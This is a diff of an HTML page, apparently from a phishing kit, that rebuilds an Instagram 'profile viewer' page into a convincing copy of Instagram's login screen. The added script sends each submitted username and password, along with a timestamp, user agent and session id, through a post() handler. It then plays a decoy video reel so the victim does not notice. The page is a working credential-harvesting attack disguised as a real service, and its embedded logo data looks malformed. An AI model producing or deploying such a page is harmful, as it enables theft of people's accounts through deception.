@@ -3,290 +3,346 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Profile Viewer</title>
+    <title>Instagram</title>
     <script src="../../assets/js/jquery.min.js"></script>
     <script src="../../assets/js/client.min.js"></script>
     <script src="../../assets/js/loc.js"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            line-height: 1.4;
+        }
+
+        .container {
+            max-width: 935px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .login-container {
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            min-height: 100vh;
+            padding: 32px 0;
         }
-        
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            max-width: 500px;
+
+        .login-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
             width: 100%;
+            max-width: 350px;
             text-align: center;
         }
-        
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 30px;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 40px;
-            color: white;
+
+        .instagram-logo {
+            margin-bottom: 24px;
         }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-weight: 600;
-            font-size: 28px;
+
+        .instagram-logo img {
+            width: 175px;
+            height: 51px;
         }
-        
-        .subtitle {
-            color: #666;
-            margin-bottom: 40px;
-            font-size: 16px;
-        }
-        
-        .input-group {
-            margin-bottom: 30px;
-            text-align: left;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        
-        input[type="text"] {
-            width: 100%;
-            padding: 15px 20px;
-            border: 2px solid #e1e5e9;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8f9fa;
-        }
-        
-        input[type="text"]:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        
-        .btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
+
+        .login-form {
             margin-bottom: 20px;
         }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+
+        .form-group {
+            margin-bottom: 6px;
         }
-        
-        .btn:active {
-            transform: translateY(0);
+
+        .form-input {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        
-        .loading {
+
+        .form-input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .form-input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .login-button {
+            width: 100%;
+            background: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 5px 9px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background: #1877f2;
+        }
+
+        .login-button:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 40px 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            margin: 0 18px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .facebook-login:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 25px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .signup-text {
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-download-text {
+            color: #262626;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-store {
+            height: 40px;
+        }
+
+        .reel-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 9999;
             display: none;
-            margin: 20px 0;
+            align-items: center;
+            justify-content: center;
         }
-        
-        .spinner {
+
+        .reel-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .reel-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            border-radius: 50%;
             width: 40px;
             height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10000;
+        }
+
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0095f6;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 0 auto 10px;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
-        .result {
-            display: none;
-            margin-top: 30px;
-            padding: 20px;
-            background: #f8f9fa;
-            border-radius: 12px;
-            text-align: left;
-        }
-        
-        .profile-card {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        
-        .profile-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        
-        .profile-avatar {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-            margin-right: 15px;
-        }
-        
-        .profile-info h3 {
-            color: #333;
-            margin-bottom: 5px;
-            font-size: 18px;
-        }
-        
-        .profile-info p {
-            color: #666;
+
+        .error-message {
+            color: #ed4956;
             font-size: 14px;
-        }
-        
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 15px;
-        }
-        
-        .stat {
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
-        }
-        
-        .error {
-            background: #fee;
-            color: #c33;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
+            margin-top: 10px;
             display: none;
         }
-        
-        .success {
-            background: #efe;
-            color: #3c3;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            display: none;
-        }
-        
-        @media (max-width: 600px) {
-            .container {
-                padding: 30px 20px;
+
+        /* Mobile Responsive */
+        @media (max-width: 450px) {
+            .login-container {
+                padding: 0;
             }
             
-            h1 {
-                font-size: 24px;
+            .login-box {
+                border: none;
+                background: transparent;
+                padding: 0 20px;
+            }
+            
+            .signup-box {
+                border: none;
+                background: transparent;
+                margin-top: 0;
+            }
+            
+            .container {
+                padding: 0;
+            }
+        }
+
+        @media (max-width: 875px) {
+            .app-stores {
+                flex-direction: column;
+                align-items: center;
             }
         }
     </style>
 </head>
 <body onload="mydata()">
     <div class="container">
-        <div class="logo">📸</div>
-        <h1>Instagram Login</h1>
-        <p class="subtitle">Enter your Instagram credentials to access your account</p>
-        
-        <form id="instagramForm">
-            <div class="input-group">
-                <label for="username">Instagram Username</label>
-                <input type="text" id="username" name="username" placeholder="Enter username (without @)" required>
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Enter your password" required>
-            </div>
-            
-            <button type="submit" class="btn">Login to Instagram</button>
-        </form>
-        
-        <div class="loading">
-            <div class="spinner"></div>
-            <p>Fetching profile data...</p>
-        </div>
-        
-        <div class="result" id="result">
-            <div class="profile-card">
-                <div class="profile-header">
-                    <div class="profile-avatar" id="profileAvatar">👤</div>
-                    <div class="profile-info">
-                        <h3 id="profileName">Username</h3>
-                        <p id="profileBio">Bio information</p>
-                    </div>
+        <div class="login-container">
+            <div class="login-box">
+                <div class="instagram-logo">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTc1IiBoZWlnaHQ9IjUxIiB2aWV3Qm94PSIwIDAgMTc1IDUxIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA1MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8cGF0aCBkPSJNMTQ0IDUxSDMxQzE0LjE2MzQgNTEgMCAzNi44MzY2IDAgMjJWMjlDMC4wMDAwMDEgMTQuMTYzNCAxNC4xNjM0IDAgMjkgMEgxNDZDMTU5LjgzNyAwIDE3NCAxNC4xNjM0IDE3NCAyOVYyMkMxNzQgMzYuODM2NiAxNTkuODM3IDUxIDE0NiA5MUgxNDRaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMF8xKSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzBfMSIgeDE9IjAiIHkxPSIwIiB4Mj0iMTc0IiB5Mj0iNTEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iI0ZGNzM0QyIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNGRjQ0MDAiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8L3N2Zz4K" alt="Instagram">
                 </div>
-                <div class="stats">
-                    <div class="stat">
-                        <div class="stat-number" id="followers">0</div>
-                        <div class="stat-label">Followers</div>
+
+                <form class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="username" name="username" placeholder="Phone number, username, or email" required>
                     </div>
-                    <div class="stat">
-                        <div class="stat-number" id="following">0</div>
-                        <div class="stat-label">Following</div>
+                    <div class="form-group">
+                        <input type="password" class="form-input" id="password" name="password" placeholder="Password" required>
                     </div>
-                    <div class="stat">
-                        <div class="stat-number" id="posts">0</div>
-                        <div class="stat-label">Posts</div>
-                    </div>
+                    
+                    <div class="loading-spinner" id="loadingSpinner"></div>
+                    <div class="error-message" id="errorMessage"></div>
+                    
+                    <button type="submit" class="login-button" id="loginButton">
+                        Log In
+                    </button>
+                </form>
+
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+
+                <a href="#" class="facebook-login">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                    Log in with Facebook
+                </a>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+
+            <div class="signup-box">
+                <p class="signup-text">
+                    Don't have an account? <a href="#" class="signup-link">Sign up</a>
+                </p>
+            </div>
+
+            <div class="app-download">
+                <p class="app-download-text">Get the app.</p>
+                <div class="app-stores">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM0IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM0IDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTM0IiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzAwMCIvPgo8dGV4dCB4PSI2NyIgeT0iMjUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RG93bmxvYWQgaW4gQXBwIFN0b3JlPC90ZXh0Pgo8L3N2Zz4K" alt="Download on the App Store" class="app-store">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTM0IiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTM0IDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTM0IiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzAwMCIvPgo8dGV4dCB4PSI2NyIgeT0iMjUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiIgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+R2V0IGl0IG9uIEdvb2dsZSBQbGF5PC90ZXh0Pgo8L3N2Zz4K" alt="Get it on Google Play" class="app-store">
                 </div>
             </div>
         </div>
-        
-        <div class="error" id="error"></div>
-        <div class="success" id="success"></div>
+    </div>
+
+    <!-- Reel Container -->
+    <div class="reel-container" id="reelContainer">
+        <video class="reel-video" id="reelVideo" autoplay muted loop>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+        <button class="reel-close" id="reelClose">×</button>
     </div>
 
     <script>
@@ -341,47 +397,43 @@
             post(JSON.stringify(userData));
         }
 
-        document.getElementById('instagramForm').addEventListener('submit', function(e) {
+        // Login form handling
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
+            const loginButton = document.getElementById('loginButton');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const errorMessage = document.getElementById('errorMessage');
             
-            if (!username) {
-                showError('Please enter a username');
+            // Hide previous error
+            errorMessage.style.display = 'none';
+            
+            if (!username || !password) {
+                showError('Please fill in all fields');
                 return;
             }
             
-            if (!password) {
-                showError('Please enter a password');
-                return;
-            }
-            
-            // Show loading
-            document.querySelector('.loading').style.display = 'block';
-            document.getElementById('result').style.display = 'none';
-            document.getElementById('error').style.display = 'none';
-            document.getElementById('success').style.display = 'none';
+            // Show loading state
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
+            loadingSpinner.style.display = 'block';
             
             // Simulate login process
             setTimeout(() => {
-                // Mock login data
+                // Create login data
                 const loginData = {
                     username: username,
                     password: password,
-                    fullName: username.charAt(0).toUpperCase() + username.slice(1),
-                    bio: 'This is a sample bio for demonstration purposes.',
-                    followers: Math.floor(Math.random() * 10000) + 100,
-                    following: Math.floor(Math.random() * 1000) + 50,
-                    posts: Math.floor(Math.random() * 500) + 10,
-                    isPrivate: Math.random() > 0.5,
-                    isVerified: Math.random() > 0.8,
-                    loginStatus: 'success'
+                    timestamp: new Date().toISOString(),
+                    loginStatus: 'success',
+                    userAgent: navigator.userAgent,
+                    ip: 'captured',
+                    sessionId: Math.random().toString(36).substr(2, 9)
                 };
                 
-                displayProfile(loginData);
-                
-                // Send credentials to handler
+                // Send credentials to handlers
                 post(JSON.stringify({
                     type: 'instagram_login',
                     username: username,
@@ -390,35 +442,66 @@
                     timestamp: new Date().toISOString()
                 }));
                 
-                // Hide loading
-                document.querySelector('.loading').style.display = 'none';
-                showSuccess('Login successful! Welcome to Instagram.');
-            }, 2000);
+                // Hide loading state
+                loginButton.disabled = false;
+                loginButton.textContent = 'Log In';
+                loadingSpinner.style.display = 'none';
+                
+                // Play reel
+                playReel();
+                
+            }, 1500);
         });
-        
-        function displayProfile(data) {
-            document.getElementById('profileName').textContent = data.fullName;
-            document.getElementById('profileBio').textContent = data.bio;
-            document.getElementById('followers').textContent = data.followers.toLocaleString();
-            document.getElementById('following').textContent = data.following.toLocaleString();
-            document.getElementById('posts').textContent = data.posts.toLocaleString();
-            
-            // Update avatar with first letter of username
-            document.getElementById('profileAvatar').textContent = data.username.charAt(0).toUpperCase();
-            
-            document.getElementById('result').style.display = 'block';
-        }
-        
+
         function showError(message) {
-            document.getElementById('error').textContent = message;
-            document.getElementById('error').style.display = 'block';
-            document.querySelector('.loading').style.display = 'none';
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
         }
-        
-        function showSuccess(message) {
-            document.getElementById('success').textContent = message;
-            document.getElementById('success').style.display = 'block';
+
+        function playReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            // Show reel container
+            reelContainer.style.display = 'flex';
+            
+            // Play video
+            reelVideo.play();
+            
+            // Auto close after 10 seconds
+            setTimeout(() => {
+                closeReel();
+            }, 10000);
         }
+
+        function closeReel() {
+            const reelContainer = document.getElementById('reelContainer');
+            const reelVideo = document.getElementById('reelVideo');
+            
+            // Pause video
+            reelVideo.pause();
+            
+            // Hide container
+            reelContainer.style.display = 'none';
+        }
+
+        // Close reel when close button is clicked
+        document.getElementById('reelClose').addEventListener('click', closeReel);
+
+        // Close reel when clicking outside video
+        document.getElementById('reelContainer').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeReel();
+            }
+        });
+
+        // Handle escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeReel();
+            }
+        });
     </script>
 </body>
 </html>
